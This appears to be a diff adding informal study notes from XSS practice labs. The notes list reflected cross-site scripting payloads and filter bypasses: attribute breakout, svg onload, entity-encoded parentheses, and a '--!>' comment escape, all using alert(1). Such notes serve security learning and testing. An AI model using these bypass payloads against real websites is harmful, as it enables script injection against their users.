@@ -42,3 +42,45 @@ challenge 8 :
 if the website has multiple parameter than and 1 of the input paramter is sanitisated than try for other parameters
 http://leettime.net/xsslab1/stage--08.php?name=bat&submit=spider
 here try to give the payload for the submit parameter 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+<input type="text" value=""><script>alert(1)</script>
+"><script>alert(1)</script>
+
+
+<script>alert(!)</script> /// here it getting filtered after placing ">"
+<article>alert(!)</article>
+
+<svg/onload=alert(1); 
+--<article><svg/onload=alert(1); </article>
+
+<script>alert(1)</script>
+<script>alert1)</script> /// here ( is getting filtered 
+function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, '');             /////filtered 
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+}
+-- <script>alert1)</script>
+//&#40;     Left parenthesis
+--<svg><script>alert&#40;1)</script>
+<svg> is used because whenever the input is reflected as the plaintxt than use svg
+here & means continue
+# means Number
+40 is the numeric value for (  and to end ; 
+
+
+input praj
+<!-- praj --> 
+function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/->/g, '_'); /// here it is replacing the values 
+
+    // comment the input to avoid script execution
+    return '<!-- ' + input + ' -->';
+}        
+payload
+--!><script>alert(1)</script> // inorder to end the comment --!>
